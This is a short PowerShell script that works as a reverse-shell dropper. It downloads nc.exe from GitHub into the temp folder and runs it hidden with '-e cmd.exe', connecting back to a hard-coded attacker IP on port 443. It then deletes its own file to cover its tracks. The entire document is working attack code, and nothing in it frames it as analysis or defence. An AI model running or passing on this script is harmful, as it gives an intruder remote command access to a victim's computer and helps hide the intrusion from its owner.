[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# Stable nc.exe (x86)
$ncUrl      = "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
$ncPath     = "$env:TEMP\nc.exe"
$attackerIP = "192.168.1.104"
$port       = "443"

# Downloads
try {
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30
} catch {
    exit 1
}

# Run
if (Test-Path $ncPath) {
    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden
}

# Delete
Start-Sleep -Seconds 2
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

